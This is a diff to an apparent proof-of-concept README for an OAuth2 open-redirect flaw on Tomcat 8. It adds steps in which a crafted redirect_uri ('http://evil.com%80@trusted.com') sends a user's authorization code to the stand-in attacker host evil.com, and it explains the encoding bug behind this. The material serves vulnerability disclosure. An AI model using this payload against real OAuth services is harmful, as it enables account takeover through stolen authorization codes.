@@ -7,7 +7,9 @@
 
 ```
 
-## 2) open the following url in your browser / curl
+## 2a) POC - Redirect without login (response type unknown)
+
+open the following url in your browser / curl
 
     http://localhost:8080/oauth/authorize?client_id=clientId&redirect_uri=http://evil.com%80@trusted.com&response_type=bogus
 
@@ -32,6 +34,19 @@ $ curl -v "http://localhost:8080/oauth/authorize?client_id=clientId&redirect_uri
   * Connection #0 to host localhost left intact
 ```
 
-### Explanation:
+## 2b) POC - Redirect with authorization code
+
+
+1) open the following url in your browser
+
+    http://localhost:8080/oauth/authorize?client_id=clientId&redirect_uri=http://evil.com%80@trusted.com&grant_type=authorization_code&response_type=code
+    
+2) Login with 'user' / 'password'
+
+3) Observe 302 redirect with authorization code to attacker website, e.g. 
+
+    http://evil.com/?@trusted.com?code=HSJwVn
+
+## Explanation:
 
 Tomcat 8 defaults to `UTF-8` to decode request params. `%80` can't be decoded as it's an invalid `UTF-8` hence it gets replaced by `� `. This character isn't a valid in `ISO 8859-1` which is used to serialize headers. This character gets replaced with `?` which leads to open redirect whenever oauth2 redirects back to the resource service (in both _success_ or _error_ cases!!!).
